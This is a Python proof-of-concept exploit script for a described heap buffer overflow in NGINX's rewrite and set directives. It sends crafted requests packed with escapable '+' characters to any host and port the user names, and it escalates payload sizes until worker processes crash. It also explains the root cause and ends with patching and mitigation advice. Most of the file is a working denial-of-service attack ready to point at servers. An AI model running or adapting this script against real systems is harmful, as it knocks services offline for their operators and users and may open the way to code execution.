#!/usr/bin/env python3
"""
CVE-2026-42945 - NGINX Rift DoS Proof of Concept
=================================================

This script demonstrates a Denial of Service exploit for CVE-2026-42945,
a heap buffer overflow vulnerability.

Trigger conditions:
1. NGINX configuration uses both `rewrite` (replacement string containing '?') 
   and `set` (referencing a capture group).
2. The request URI contains escapable characters (+, &, space, etc.).

How it works:
- The `rewrite` directive sets e->is_args = 1 (never reset).
- The length calculation phase for the `set` directive uses an all-zero
  sub-engine (le.is_args = 0).
- Length calculation does not account for URI escaping, but the actual copy
  operation does.
- Each escapable character expands from 1 byte to 3 bytes (%XX format).
- This causes a write beyond the allocated buffer boundary.

Disclaimer: For security research and educational purposes only.
"""

import socket
import sys
import time
import argparse


def create_malicious_request(path_payload: str) -> bytes:
    """
    Construct an HTTP request that triggers the vulnerability.

    The URI path must match the location's regular expression and contain
    a large number of escapable characters.
    In NGX_ESCAPE_ARGS mode, the following characters are escaped to %XX:
    - '+' (0x2B) -> %2B
    - '&' (0x26) -> %26  
    - '%' (0x25) -> %25
    - space and other control characters

    Each escapable character causes a 2-byte overflow (1 byte -> 3 bytes).
    """
    request = (
        f"GET /api/{path_payload} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    return request.encode()


def send_request(host: str, port: int, request: bytes, timeout: float = 5.0) -> tuple:
    """
    Send a request and return (success, response_or_error).
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(request)
        
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break
        
        sock.close()
        return (True, response)
    except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError) as e:
        return (False, str(e))
    except socket.timeout:
        return (False, "timeout")
    except Exception as e:
        return (False, str(e))


def test_normal_request(host: str, port: int) -> bool:
    """Test if the server responds normally."""
    request = b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
    success, response = send_request(host, port, request)
    if success and b"200 OK" in response:
        return True
    return False


def test_vulnerability(host: str, port: int, overflow_size: int = 200) -> dict:
    """
    Test for CVE-2026-42945 vulnerability.

    Args:
        host: Target host
        port: Target port
        overflow_size: Expected number of overflow bytes (each '+' contributes 2 bytes)

    Returns:
        Dictionary with test results
    """
    results = {
        "vulnerable": False,
        "details": [],
        "crash_detected": False,
    }
    
    # Step 1: Confirm the server is running normally
    print("[*] Step 1: Checking if target server is reachable...")
    if not test_normal_request(host, port):
        results["details"].append("Target server is unreachable")
        return results
    print("[+] Server is running normally")
    
    # Step 2: Send a normal request to the vulnerable location to confirm routing
    print("[*] Step 2: Testing if the vulnerable location is reachable...")
    normal_api_request = create_malicious_request("test_endpoint")
    success, response = send_request(host, port, normal_api_request)
    if success:
        if b"200" in response or b"302" in response or b"301" in response:
            print("[+] Vulnerable location is reachable")
            results["details"].append("Target location is reachable")
        else:
            print(f"[!] Unexpected response: {response[:100]}")
    else:
        print(f"[-] Cannot reach target location: {response}")
        results["details"].append(f"Cannot reach target location: {response}")
        return results
    
    # Step 3: Send a request with a small number of escapable characters (small overflow)
    print("[*] Step 3: Sending a small overflow test request...")
    small_payload = "+" * 10  # 20-byte overflow
    small_request = create_malicious_request(small_payload)
    success, response = send_request(host, port, small_request)
    if success:
        print("[+] Small-scale test: Server responded normally (overflow may not be enough to crash)")
    else:
        print(f"[!] Small-scale test: Connection abnormal - {response}")
        results["crash_detected"] = True
    
    # Step 4: Send a large number of escapable characters to trigger a significant overflow
    num_escapable_chars = overflow_size // 2  # each '+' contributes 2 bytes of overflow
    print(f"[*] Step 4: Sending large overflow request ({num_escapable_chars} escapable chars, "
          f"expected overflow {overflow_size} bytes)...")
    
    large_payload = "+" * num_escapable_chars
    large_request = create_malicious_request(large_payload)
    
    success, response = send_request(host, port, large_request)
    if not success:
        print(f"[!] Large-scale test: Connection abnormal - {response}")
        results["crash_detected"] = True
        results["details"].append(f"Connection abnormal after sending {num_escapable_chars} escapable chars")
    else:
        if b"502" in response or b"500" in response:
            print("[!] Received 502/500 error - worker may have crashed")
            results["crash_detected"] = True
        else:
            print("[*] Server still responding (may need larger payload or configuration mismatch)")
    
    # Step 5: Wait a moment and then re-check server status
    print("[*] Step 5: Waiting 2 seconds and then re-checking server status...")
    time.sleep(2)
    
    if test_normal_request(host, port):
        if results["crash_detected"]:
            print("[+] Server has recovered (master process forked a new worker)")
            results["vulnerable"] = True
            results["details"].append("Worker crashed and recovered - vulnerability confirmed")
        else:
            print("[*] Server continues to run normally")
            results["details"].append("No crash detected - configuration may not match or version is patched")
    else:
        print("[!] Server is unreachable - the entire service may have crashed")
        results["vulnerable"] = True
        results["crash_detected"] = True
        results["details"].append("Server completely unavailable")
    
    # Step 6: Try increasingly larger payloads
    if not results["crash_detected"]:
        print("[*] Step 6: Trying larger payloads...")
        for size in [500, 1000, 2000, 4000]:
            chars = size // 2
            payload = "+" * chars
            request = create_malicious_request(payload)
            success, response = send_request(host, port, request)
            if not success or (success and (b"502" in response or b"500" in response)):
                print(f"[!] Anomaly detected at {chars} characters!")
                results["crash_detected"] = True
                results["vulnerable"] = True
                results["details"].append(f"Crash triggered at {chars} escapable characters")
                break
            else:
                print(f"    {chars} characters: normal")
    
    return results


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-42945 (NGINX Rift) DoS PoC - Heap Buffer Overflow Verification"
    )
    parser.add_argument(
        "--host", default="127.0.0.1",
        help="Target host (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--port", type=int, default=8080,
        help="Target port (default: 8080)"
    )
    parser.add_argument(
        "--overflow-size", type=int, default=200,
        help="Initial overflow size in bytes (default: 200)"
    )
    
    args = parser.parse_args()
    
    print("=" * 70)
    print("  CVE-2026-42945 - NGINX Rift Heap Buffer Overflow PoC")
    print("  Affected versions: NGINX 0.6.27 ~ 1.30.0")
    print("  Type: Heap overflow -> DoS / RCE")
    print("=" * 70)
    print()
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Initial overflow size: {args.overflow_size} bytes")
    print()
    
    results = test_vulnerability(args.host, args.port, args.overflow_size)
    
    print()
    print("=" * 70)
    print("  Test Results")
    print("=" * 70)
    
    if results["vulnerable"]:
        print("[!!!] Target may be vulnerable to CVE-2026-42945!")
        print()
        print("  Evidence of vulnerability:")
        for detail in results["details"]:
            print(f"    - {detail}")
        print()
        print("  Recommendations:")
        print("    1. Immediately upgrade to NGINX 1.31.0 or later")
        print("    2. If upgrade cannot be done now, check for the following in configuration:")
        print("       - rewrite directive (with '?' in replacement string)")
        print("       - set directive (referencing regex capture groups like $1, $2)")
        print("    3. Temporary mitigation: remove the set directive or avoid referencing capture groups after rewrite")
    elif results["crash_detected"]:
        print("[!] Abnormal behavior detected but cannot confirm as CVE-2026-42945")
    else:
        print("[*] No vulnerability indicators detected")
        print("    Possible reasons:")
        print("    - Target is already patched (>= 1.31.0)")
        print("    - Configuration does not use the vulnerable rewrite+set pattern")
        print("    - Network issues prevented the request from reaching the server")
    
    print()
    return 0 if not results["vulnerable"] else 1


if __name__ == "__main__":
    sys.exit(main())